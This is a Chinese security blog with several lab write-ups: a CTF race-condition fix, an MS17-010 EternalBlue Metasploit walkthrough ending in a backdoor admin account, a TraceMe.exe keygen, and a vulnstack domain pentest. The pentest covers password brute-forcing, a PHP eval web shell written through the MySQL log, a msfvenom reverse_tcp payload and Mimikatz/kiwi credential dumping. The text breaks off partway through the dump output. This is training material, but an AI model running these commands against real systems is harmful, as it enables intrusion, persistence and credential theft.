        file_put_contents(<span class="hljs-string">&quot;$savepath&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);
    &#125;</code></pre>

<p>可以发现会我们传入的<code>filename</code>会固定的存储在一个固定的位置，而这个位置会在输出中得到。<br>而文件的内容先是flag然后延迟一下马上替换为了 Too slow! 。其实输入的content并没任何作用。<br>思路：我们一直上传同一个文件名，然后使用python或者pb不断的访问这个文件。如果够快就不会把文本内容替换为 Too slow! 这样我们就可以访问到flag</p>
<h1 id="MS17-010漏洞利用演示"><a href="#MS17-010漏洞利用演示" class="headerlink" title="MS17-010漏洞利用演示"></a>MS17-010漏洞利用演示</h1><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
<p>Kali IP 192.168.164.143</p>
<p>win7 IP 192.168.164.135 </p>
<p> 使用ping测试即可</p>
<p>使用msf前需要开启postgresql服务 </p>
<p>开启服务：</p>
<pre><code class="hljs crmsh">service postgresql <span class="hljs-literal">start</span></code></pre>

<p>查看服务状态：</p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">service postgresql status</span></code></pre>

<p>开到绿色字体的active即为开启了</p>
<p>初始化数据库：</p>
<pre><code class="hljs csharp">msfdb <span class="hljs-keyword">init</span></code></pre>

<p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" alt="3.png" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210410130055679.png" alt="image-20210410130055679" style="zoom:50%;"> </p>
<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><p><strong>(1).首先判断目标主机是否打开445端口</strong></p>
<p>使用nmap+ip 扫描</p>
<img src="https://i.loli.net/2020/11/30/OPuivdSaVlTIMsm.png" alt="4.png" style="zoom:50%;"> 

<p><strong>(2) .确认目标主机打开445端口后直接使用msf进行攻击</strong></p>
<p>输入<code>msfconsole</code>　启动msf</p>
<p>输入search　MS17-010</p>
<p>找到exploit windows&#x2F;smb&#x2F;ms17_010_eternalblue,</p>
<p>运行</p>
<pre><code class="hljs awk">use exploitwindows<span class="hljs-regexp">/smb/m</span>s17_010_eternalblue</code></pre>

<p>输入 show options  查看需要配置哪些信息</p>
<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
<p>RPORT 为目标端口号(445)</p>
<p>LHOST 为监听主机IP(10.1.1.1)</p>
<img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" alt="5.png" style="zoom:50%;"> 



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210410130809305.png" alt="image-20210410130809305"></p>
<p><strong>(3). 配置成功后设置tcp连接</strong></p>
<p>输入命令</p>
<pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</code></pre>

<p><strong>(4).开始运行</strong></p>
<p>输入 exploit&#x2F;run </p>
<p>成功获取shell</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210410163228489.png" alt="image-20210410163228489" style="zoom:50%;">

<p>查看ip地址验证是否为目标主机。</p>
<p><strong>(5)设立后门，在目标主机中创建一个用户</strong></p>
<p>创建一个用户</p>
<pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> abc123.com /add</code></pre>

<p>Username:test </p>
<p>password:abc123.com</p>
<p>将该用户加入管理员组，使其拥有管理员权限</p>
<pre><code class="hljs bash">net localgroup administrtors <span class="hljs-built_in">test</span> /add</code></pre>

<p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" alt="10.png"></p>
<p>目标主机上用户创建成功</p>
<img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" alt="11.png" style="zoom: 50%;">

<p>  <strong>实验结束</strong></p>
<h1 id="TraceMe-exe注册机"><a href="#TraceMe-exe注册机" class="headerlink" title="TraceMe.exe注册机"></a>TraceMe.exe注册机</h1><p>打开程序，随便试一试</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514154316260.png" alt="image-20210514154316260"></p>
<p>通过OD打开该程序，它会自动定位到模块入口点0x004013A0位置，也就是验证函数的内容</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514155349139.png" alt="image-20210514155349139" style="zoom:67%;">

<p>数据表中405030的数据，程序中需要用到</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514155944624.png" alt="image-20210514155944624"></p>
<p>汇编代码的如下</p>
<pre><code class="hljs vb"><span class="hljs-number">00401340</span>  /$  <span class="hljs-number">55</span>            push ebp
<span class="hljs-number">00401341</span>  |.  <span class="hljs-number">8</span>B6C24 <span class="hljs-number">0</span>C     mov ebp,dword ptr ss:[esp+<span class="hljs-number">0</span>xC]          ;ebp = 用户名
<span class="hljs-number">00401345</span>  |.  <span class="hljs-number">56</span>            push esi                                 ;  TraceMe.<span class="hljs-number">0040504</span>F
<span class="hljs-number">00401346</span>  |.  <span class="hljs-number">57</span>            push edi
<span class="hljs-number">00401347</span>  |.  <span class="hljs-number">8</span>B7C24 <span class="hljs-number">18</span>     mov edi,dword ptr ss:[esp+<span class="hljs-number">0</span>x18]         ;edi = 用户名的长度
<span class="hljs-number">0040134</span>B  |.  B9 <span class="hljs-number">03000000</span>   mov ecx,<span class="hljs-number">0</span>x3 ;ecx = 从用户名的第四个字符开始计算
<span class="hljs-number">00401350</span>  |.  <span class="hljs-number">33</span>F6          <span class="hljs-built_in">xor</span> esi,esi     ;esi = <span class="hljs-number">0</span> = 计算出的注册码                             ;  TraceMe.<span class="hljs-number">0040504</span>F
<span class="hljs-number">00401352</span>  |.  <span class="hljs-number">33</span>C0          <span class="hljs-built_in">xor</span> eax,eax     ;eax = <span class="hljs-number">0</span>,用于计数，读取数据表的第eax个字节
<span class="hljs-number">00401354</span>  |.  <span class="hljs-number">3</span>BF9          cmp edi,ecx     ;<span class="hljs-keyword">if</span>(edi &gt; ecx)
<span class="hljs-number">00401356</span>  |.  <span class="hljs-number">7</span>E <span class="hljs-number">21</span>         jle <span class="hljs-type">short</span>   ;&#123; TraceMe.<span class="hljs-number">00401379</span>
<span class="hljs-number">00401358</span>  |.  <span class="hljs-number">53</span>            push ebx
<span class="hljs-number">00401359</span>  |&gt;  <span class="hljs-number">83</span>F8 <span class="hljs-number">07</span>       /cmp eax,<span class="hljs-number">0</span>x7    ; <span class="hljs-keyword">if</span>(eax &gt; <span class="hljs-number">7</span>)
<span class="hljs-number">0040135</span>C  |.  <span class="hljs-number">7</span>E <span class="hljs-number">02</span>         |jle <span class="hljs-type">short</span> TraceMe.<span class="hljs-number">00401360</span>
<span class="hljs-number">0040135</span>E  |.  <span class="hljs-number">33</span>C0          |<span class="hljs-built_in">xor</span> eax,eax    ;&#123;eax = <span class="hljs-number">0</span>;&#125;
<span class="hljs-number">00401360</span>  |&gt;  <span class="hljs-number">33</span>D2          |<span class="hljs-built_in">xor</span> edx,edx    ;edx = <span class="hljs-number">0</span>;
<span class="hljs-number">00401362</span>  |.  <span class="hljs-number">33</span>DB          |<span class="hljs-built_in">xor</span> ebx,ebx    ;ebx = <span class="hljs-number">0</span>
<span class="hljs-number">00401364</span>  |.  <span class="hljs-number">8</span>A1429        |mov dl,<span class="hljs-type">byte</span> ptr ds:[ecx+ebp]   ; dl = ebp + ecx = 从用户名的第四个字符开始计算
<span class="hljs-number">00401367</span>  |.  <span class="hljs-number">8</span>A98 <span class="hljs-number">30504000</span> |mov bl,<span class="hljs-type">byte</span> ptr ds:[eax+<span class="hljs-number">0</span>x405030]  ;bl = 数据表第eax个字符，数据表的内存地址为<span class="hljs-number">0</span>x00405030处，查找其数值为<span class="hljs-number">0</span>C <span class="hljs-number">0</span>A <span class="hljs-number">13</span> <span class="hljs-number">09</span> <span class="hljs-number">0</span>C <span class="hljs-number">0</span>B <span class="hljs-number">0</span>A <span class="hljs-number">08</span>(根据判断语句<span class="hljs-number">0</span>x00401359可知，只有<span class="hljs-number">8</span>个数据)
<span class="hljs-number">0040136</span>D  |.  <span class="hljs-number">0</span>FAFD3        |imul edx,ebx   ;edx = edx * ebx
<span class="hljs-number">00401370</span>  |.  <span class="hljs-number">03</span>F2          |add esi,edx    ;esi = esi + edx
<span class="hljs-number">00401372</span>  |.  <span class="hljs-number">41</span>            |inc ecx    ;ecx++
<span class="hljs-number">00401373</span>  |.  <span class="hljs-number">40</span>            |inc eax    ;eax++;
<span class="hljs-number">00401374</span>  |.  <span class="hljs-number">3</span>BCF          |cmp ecx,edi    ;<span class="hljs-keyword">if</span>(ecx&lt;edi)   如果未取完用户名字符则继续
<span class="hljs-number">00401376</span>  |.^ <span class="hljs-number">7</span>C E1         \jl <span class="hljs-type">short</span>   ;&#123;<span class="hljs-keyword">goto</span> <span class="hljs-number">0</span>x00401359&#125; TraceMe.<span class="hljs-number">00401359</span>
<span class="hljs-number">00401378</span>  |.  <span class="hljs-number">5</span>B            pop ebx   ;计算结束                               ;  <span class="hljs-number">0012</span>FAE8
<span class="hljs-number">00401379</span>  |&gt;  <span class="hljs-number">56</span>            push esi                                 ; /&lt;%ld&gt; = <span class="hljs-number">40504</span>F (<span class="hljs-number">4214863</span>.)</code></pre>



<p>使用python写出注册机</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">crake_traceme</span>():
	code, <span class="hljs-built_in">len</span> = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>
	username = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入用户名&quot;</span>)
	num = [<span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x08</span>]
	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-built_in">len</span>(username)):
    	<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span> &gt; <span class="hljs-number">7</span>:
        	<span class="hljs-built_in">len</span> = <span class="hljs-number">0</span>
    	code += <span class="hljs-built_in">ord</span>(username[i]) * num[<span class="hljs-built_in">len</span>]
    	<span class="hljs-built_in">len</span> += <span class="hljs-number">1</span>
	<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The code is:\n&quot;</span> + <span class="hljs-built_in">str</span>(code))
crake_traceme()</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210418222548281.png" alt="image-20210418222548281"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514155437404.png" alt="image-20210514155437404"></p>
<h1 id="一次域渗透测试攻击"><a href="#一次域渗透测试攻击" class="headerlink" title="一次域渗透测试攻击"></a>一次域渗透测试攻击</h1><p>第一次做渗透测试，有的地方做的不是很好</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用的靶机是红日安全提供的，地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
<p>搭建过程中有一点需要注意</p>
<p>Web服务主机win7有两块网卡，需要在设置中再添加一块网卡</p>
<p>网卡一连接到<code>VMnet2</code>中，作为内网环境</p>
<p>网卡二连接到<code>VMnet1</code>中，作为公网环境，并攻击机连到<code>VMnet1</code>中,确保其可以访问网站主页</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130030032.png" alt="image-20210511130030032" style="zoom:50%;">

<p>剩下的两台域控主机直接连接到<code>VMnet2</code>中即可，可以与web服务器通信</p>
<p>修改window10物理机的VMnet1网卡</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511214717086.png" alt="image-20210511214717086" style="zoom:67%;">

<p>这样物理机和kali都可以访问到靶机网站</p>
<p><strong>实验拓扑图:</strong></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511124808522.png" alt="image-20210511124808522" style="zoom: 50%;">

<ul>
<li>web服务器(win7): 公网IP:192.168.74.128   内网IP: 192.168.52.143 主机名:stu1</li>
<li>域成员主机(Windows Server 2003)：192.168.52.141 主机名：root-tvi862ubeh</li>
<li>域控(Windows Server 2008)：192.168.52.138 主机名：owa</li>
</ul>
<p>web服务器有两块网卡，其中192.168.74.128模拟的是公网环境，攻击者可以直接访问，192.168.52.143属于内网，攻击者无法直接访问</p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="网站探测"><a href="#网站探测" class="headerlink" title="网站探测"></a>网站探测</h3><p>首先访问网站主页: <a href="http://192.168.74.129/yxcms">http://192.168.74.129/yxcms</a></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130446365.png" alt="image-20210511130446365" style="zoom: 50%;">

<p>先扫描一下目录</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511153857974.png" alt="image-20210511153857974" style="zoom:50%;">

<p>可以看存在很多可以访问的目录，并且这些目录都存在目录遍历漏洞，如<code>/public</code>,可以看到该目录下的很多内容，但是没有想要内容</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511154129595.png" alt="image-20210511154129595" style="zoom: 33%;">



<h3 id="网站漏洞利用getshell"><a href="#网站漏洞利用getshell" class="headerlink" title="网站漏洞利用getshell"></a>网站漏洞利用getshell</h3><ul>
<li><p>经过探测网站的后台登录页面是<code>http://192.168.74.129/yxcms/index.php?r=admin/index/login</code></p>
<p>经过爆破很容易试出密码为<code>123456</code></p>
<p>成功登录后台</p>
</li>
<li><p>尝试搜索网站已发现的漏洞</p>
<p>这是一个网站常用的CMS，在网上搜索一下是否存在可以直接利用的漏洞</p>
<p><a href="https://www.freebuf.com/column/162886.html">代码审计| yxcms app 1.4.6 漏洞集合</a></p>
<p>可以看到这个cms还是存在几个很好利用的漏洞的，尝试使用其中文件写入漏洞</p>
<p>访问<code>http://192.168.74.129/yxcms/index.php?r=admin/set/tpadd&amp;Mname=default</code>，这里可以写入php文件</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511155855512.png" alt="image-20210511155855512" style="zoom:50%;"></li>
</ul>
<p>写入一句话木马</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511155949294.png" alt="image-20210511155949294"></p>
<p>写入成功后，访问<code>http://192.168.74.129/yxcms/protected/apps/default/view/default/info.php</code>可以看到已经成功写入一句话木马，之后就是用蚁剑连接</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160216194.png" alt="image-20210511160216194" style="zoom: 33%;">

<p>成功获取shell，并且是system权限，这是由于该网站管理员直接使用<code>administrator</code>登录域控主机，若是在真是环境中获取的是普通用户权限则还需要配合提权，获取system权限</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160418538.png" alt="image-20210511160418538" style="zoom:50%;">



<h3 id="使用phpMyAdmin-Getshell"><a href="#使用phpMyAdmin-Getshell" class="headerlink" title="使用phpMyAdmin Getshell"></a>使用phpMyAdmin Getshell</h3><p>扫描<code>http://192.168.74.129/</code></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160728113.png" alt="image-20210511160728113" style="zoom:50%;">

<p>直接使用工具爆破，很容易得到，用户名和密码都为<code>root</code></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511132208919.png" alt="image-20210511132208919" style="zoom:50%;">

<p>一开始的想法是利用写<code>into outfile</code>写木马getshell，但是由于网站的<code> secure_file_priv</code>的值为NULL，所以我们不能利用写<code>into outfile</code>写木马getshell</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511161606685.png" alt="image-20210511161606685" style="zoom:50%;">

<p>但是还有一种方法，就是向mysql日志中写入一句话木马，具体如下:<a href="https://blog.csdn.net/qq_36119192/article/details/103461736#%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6Getshell">mysql日志木马</a></p>
<p>执行下列命令</p>
<pre><code class="hljs mysql">set global general_log=on;                                     #开启日志
set global general_log_file=&#x27;C:/phpstudy/www/yxcms/hack.php&#x27;;  #设置指定文件为网站日志存放文件
SELECT &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;               		   #执行该语句，会将该命令写入日志文件</code></pre>

<p>执行完命令，便可以在网站根目录下看到<code>hack.php</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162058801.png" alt="image-20210511162058801"></p>
<p>浏览器访问<code>http://192.168.74.129/yxcms/hack.php</code>，一句话木马访问成功</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511162146968.png" alt="image-20210511162146968" style="zoom:50%;">

<h2 id="后渗透攻击"><a href="#后渗透攻击" class="headerlink" title="后渗透攻击"></a>后渗透攻击</h2><p>在拿到了Web服务器的权限后，我们就要尽可能多的搜集该服务器的信息，然后搭建隧道通往内网。</p>
<p>执行<code>whoami</code> ,<code>ipconfig</code>,<code>net localgroup administrators</code>命令我们知道当前的用户身份是 <code>administrator</code> ，在管理员组中，并且处在域 god 中。该主机有两张网卡，分别是：192.168.74.129，192.168.52.143</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162608469.png" alt="image-20210511162608469" style="zoom: 50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162902010.png" alt="image-20210511162902010" style="zoom: 80%;"></p>
<h3 id="获取MSF-shell"><a href="#获取MSF-shell" class="headerlink" title="获取MSF shell"></a>获取MSF shell</h3><p>使用<code>msf</code>生成木马</p>
<ul>
<li><p>kali终端输入<code>msfconsole</code>，进入msf</p>
</li>
<li><p>选择带reverse和meterpreter(发送端接受端连接)的payloads进行反弹端口</p>
<pre><code class="hljs awk">use windows<span class="hljs-regexp">/x64/m</span>eterpreter_reverse_tcp</code></pre>

<p>输入<code>show options</code>查看方法</p>
</li>
<li><p>新开一个终端输入以下命令，生成木马文件，并利用蚁剑上传到目标主机中</p>
</li>
</ul>
<pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter_reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.74.130 <span class="hljs-attribute">lport</span>=4444 -f exe -o 1.exe</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511163917527.png" alt="image-20210511163917527" style="zoom: 67%;">

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511164107563.png" alt="image-20210511164107563" style="zoom: 50%;">

<ul>
<li><p>再次输入msfconsole 进入应用，输入<code>use exploit/multi/handler</code>进入管理工具，获取shell权限，命令如下</p>
<pre><code class="hljs bash">use exploit/multi/handler
<span class="hljs-built_in">set</span> payload windows/x64/meterpreter_reverse_tcp
<span class="hljs-built_in">set</span> lhost kali<span class="hljs-string">&#x27;s ip</span>
<span class="hljs-string">run</span></code></pre>

<p>即可获取shell</p>
</li>
</ul>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511165317518.png" alt="image-20210511165317518" style="zoom:67%;">



<h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><p>在<code>meterpreter</code>中运行<code>run windows/gather/smart_hashdump</code>,但是出现错误，提示需要system进程权限</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511182726579.png" alt="image-20210511182726579" style="zoom:67%;">

<p>使用<code>migrate 388</code>将meterpreter迁移到64位的进程，而且该进程也需要是system权限运行的</p>
<p>再使用<code>run windows/gather/smart_hashdump</code></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183026072.png" alt="image-20210511183026072" style="zoom: 50%;">

<p>接下来是破解该密码</p>
<p><strong>加载 kiwi模块</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span>
<span class="hljs-attribute">creds_all</span></code></pre>

<p>结果如下</p>
<pre><code class="hljs armasm"><span class="hljs-symbol">meterpreter</span> &gt; creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
<span class="hljs-symbol">msv</span> credentials
===============

<span class="hljs-symbol">Username</span>       Domain  LM                                NTLM                              SHA1
--------       ------  --                                ----                              ----
<span class="hljs-symbol">Administrator</span>  GOD     edea194d76c77d87840ac10a764c7362  <span class="hljs-number">8</span>a963371a63944419ec1adf687bb1be5  <span class="hljs-number">343</span>f44056ed02360aead5618dd42e4614b5f70cf
<span class="hljs-symbol">STU1$</span>          GOD                                       cde51539f42c2854d74e82db1173dd8c  <span class="hljs-number">50950</span>d918317edf0ab95661a565c6ebf1151fe3b

<span class="hljs-symbol">wdigest</span> credentials
===================

<span class="hljs-symbol">Username</span>       Domain  Password
--------       ------  --------
(null)         (null)  (null)
<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span>
<span class="hljs-symbol">STU1$</span>          GOD     <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b

<span class="hljs-symbol">tspkg</span> credentials
=================

<span class="hljs-symbol">Username</span>       Domain  Password
--------       ------  --------
<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span>

<span class="hljs-symbol">kerberos</span> credentials
====================

<span class="hljs-symbol">Username</span>       Domain   Password
--------       ------   --------
(null)         (null)   (null)
<span class="hljs-symbol">Administrator</span>  GOD.ORG  hongrisec<span class="hljs-comment">@2019</span>
<span class="hljs-symbol">stu1$</span>          GOD.ORG  <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span 